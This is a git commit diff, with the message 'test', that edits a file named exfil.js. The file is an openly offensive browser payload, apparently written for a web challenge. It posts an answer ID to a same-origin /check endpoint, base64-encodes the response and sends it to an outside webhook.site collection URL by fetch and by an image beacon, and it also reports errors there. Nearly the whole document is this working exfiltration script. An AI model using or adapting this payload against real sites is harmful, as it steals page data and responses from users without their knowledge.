b4535f37d3ce251d57c6e4231314ea94e2cb31a2
Tom Nightingale <tom@tnightingale.com>
2025-06-25 18:28:44 +0000

    test

--- exfil.js
+++ exfil.js
@@ -1,15 +1,13 @@
-var webhookUrl = "https://webhook.site/343d91a5-4ebb-428a-94b5-8f9d244196cf";
-var answerId = "98f11d21-e2cc-4218-82d5-24b4d4ae3fb4";
 fetch("/check", {
   method: "POST",
   headers: {"Content-Type": "application/x-www-form-urlencoded"},
-  body: `answer_id=${answerId}`
+  body: "answer_id=d6bcba62-04bd-4fae-874f-0328f5b2149d"
 })
 .then(r => r.text())
 .then(t => {
-    var p = fetch(`${webhookUrl}?dataFetch=${btoa(t)}`);
+    var p = fetch("https://webhook.site/343d91a5-4ebb-428a-94b5-8f9d244196cf?dataFetch=" + btoa(t));
     var img = new Image();
-    img.src = `${webhookUrl}?dataImg=${encodeURIComponent(btoa(t))}`;
+    img.src = "https://webhook.site/343d91a5-4ebb-428a-94b5-8f9d244196cf?dataImg=" + encodeURIComponent(btoa(t));
     document.body.appendChild(img);
     return p;
-});
+}).catch(e => fetch("https://webhook.site/343d91a5-4ebb-428a-94b5-8f9d244196cf?error=" + encodeURIComponent(e.message)));
